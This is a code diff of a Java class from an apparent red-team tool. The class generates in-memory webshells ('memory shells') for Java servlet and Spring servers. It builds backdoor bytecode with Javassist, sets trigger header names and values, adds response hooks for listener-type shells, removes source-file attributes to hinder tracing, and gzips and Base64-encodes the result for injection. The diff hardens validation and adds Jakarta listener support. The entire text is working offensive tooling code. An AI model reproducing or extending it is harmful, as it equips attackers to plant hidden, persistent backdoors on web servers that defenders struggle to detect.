@@ -5,17 +5,20 @@ import com.potato.potatotool.utils.data.StrUtils;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.bytecode.ClassFile;
 import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
 import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
+import com.potato.potatotool.content.redTeam.memshell.util.ClassNameUtil;
 import com.potato.potatotool.content.redTeam.memshell.util.JavassistUtil;
 import com.potato.potatotool.content.redTeam.memshell.util.MemoryShellUtil;
+import com.potato.potatotool.content.redTeam.memshell.util.RandomHeaderUtil;
 import com.potato.potatotool.content.redTeam.memshell.util.ResponseCodeUtil;
 
-import javax.servlet.Filter;
-import javax.servlet.ServletRequestListener;
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.IOException;
+import java.nio.file.Files;
 
 public class MemoryShellFactory {
     @SuppressWarnings("unchecked")
@@ -32,30 +35,36 @@ public class MemoryShellFactory {
             String shellClassName = MemoryShellUtil.getShellClassName(toolType, shellType);
             bytes = transformShellBytes(shellClassName, memoryObj);
         }
+        if (bytes == null || bytes.length == 0) {
+            throw new IllegalStateException("Shell bytes are empty");
+        }
+        byte[] compressedShellBytes = GzipUtils.GzipGetCompressedData(bytes);
+        if (compressedShellBytes == null || compressedShellBytes.length == 0) {
+            throw new IllegalStateException("Compressed shell bytes are empty");
+        }
 
         // 设置内存对象的字节数组、字节长度以及gzip后的Base64字符串
         memoryObj.setShellBytes(bytes);
         memoryObj.setShellBytesLength(bytes.length);
-        memoryObj.setShellGzipBase64String(StrUtils.base64Encode(GzipUtils.GzipGetCompressedData(bytes)));
+        memoryObj.setShellGzipBase64String(StrUtils.base64Encode(compressedShellBytes));
 
         return bytes;
     }
 
     // 转换内存马字节码的方法
-    private byte[] transformShellBytes(String className, MemoryObj memoryObj) {
-        byte[] bytes = new byte[0];
+    private byte[] transformShellBytes(String className, MemoryObj memoryObj) throws Exception {
+        String toolType = memoryObj.getToolType();
+        String shellType = memoryObj.getShellType();
+        CtClass ctClass = null;
         try {
-            String toolType = memoryObj.getToolType();
-            String shellType = memoryObj.getShellType();
-
             CLASS_POOL.insertClassPath(new ClassClassPath(this.getClass()));
-            CtClass ctClass = CLASS_POOL.getCtClass(className);
+            ctClass = CLASS_POOL.getCtClass(className);
 
             // 如果内存马类型不是 WFHANDLERMETHOD，则设置Java版本和头字段
             if (!shellType.equals(MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD)) {
                 ctClass.getClassFile().setVersionToJava5();
-                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerName", memoryObj.getHeaderName());
-                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerValue", memoryObj.getHeaderValue());
+                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerName", RandomHeaderUtil.requireValidHeaderName(memoryObj.getHeaderName()));
+                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerValue", RandomHeaderUtil.requireValidHeaderValue(memoryObj.getHeaderValue()));
             }
 
             // 根据工具类型设置不同的字段
@@ -75,38 +84,40 @@ public class MemoryShellFactory {
             JavassistUtil.setClassNameIfNotNull(ctClass, memoryObj.getShellClassName());
 
             // 如果内存马类型是 LISTENER，则添加相应的获取HTTP响应的方法
-            if (shellType.equals(MemoryShellConstants.SHELLTYPE_LISTENER)) {
-                String methodBody = ResponseCodeUtil.getResponseCode(memoryObj.getServerType());
+            if (isListenerShellType(shellType)) {
+                String methodBody = ResponseCodeUtil.getResponseCode(memoryObj.getServerType(), memoryObj.getShellType());
                 JavassistUtil.addOrUpdateMethod(ctClass, "getResponseFromRequest", methodBody);
             }
             // 移除源文件属性，生成字节码并分离类
             JavassistUtil.removeSourceFileAttribute(ctClass);
-            bytes = ctClass.toBytecode();
-            ctClass.detach();
-        } catch (Exception e) {
-            e.printStackTrace();
+            return ctClass.toBytecode();
+        } finally {
+            if (ctClass != null) {
+                ctClass.detach();
+            }
         }
-        return bytes;
     }
 
     private byte[] customShellBytes(MemoryObj memoryObj) throws Exception {
-        File classFile;
-        classFile = new File(memoryObj.getClassFilePath());
-        if (classFile.exists() && classFile.isFile()) {
-            ClassPool classPool = ClassPool.getDefault();
-            classPool.insertClassPath(new ClassClassPath(Filter.class));
-            classPool.insertClassPath(new ClassClassPath(ServletRequestListener.class));
-            classPool.makeInterface("org.springframework.web.servlet.AsyncHandlerInterceptor");
-            classPool.makeInterface("org.springframework.web.servlet.HandlerInterceptor");
-            String filePath = memoryObj.getClassFilePath();
-            CtClass ctClass = classPool.makeClass(new DataInputStream(new FileInputStream(filePath)));
-            memoryObj.setShellClassName(ctClass.getName());
-            ctClass.detach();
+        if (memoryObj.getClassFilePath() == null || memoryObj.getClassFilePath().trim().isEmpty()) {
+            throw new IllegalArgumentException("Class file path is empty");
+        }
+        File classFile = new File(memoryObj.getClassFilePath());
+        if (!classFile.isFile()) {
+            throw new IOException("Class file does not exist: " + memoryObj.getClassFilePath());
         }
 
-        byte[] bytes = StrUtils.readFile(memoryObj.getClassFilePath());
+        try (DataInputStream inputStream = new DataInputStream(new FileInputStream(classFile))) {
+            ClassFile classFileInfo = new ClassFile(inputStream);
+            memoryObj.setShellClassName(ClassNameUtil.requireValidJavaClassName(classFileInfo.getName(), "custom shell class name"));
+        }
 
-        return bytes;
+        return Files.readAllBytes(classFile.toPath());
+    }
+
+    private boolean isListenerShellType(String shellType) {
+        return MemoryShellConstants.SHELLTYPE_LISTENER.equals(shellType)
+                || MemoryShellConstants.SHELLTYPE_JAKARTA_LISTENER.equals(shellType);
     }
 
 }
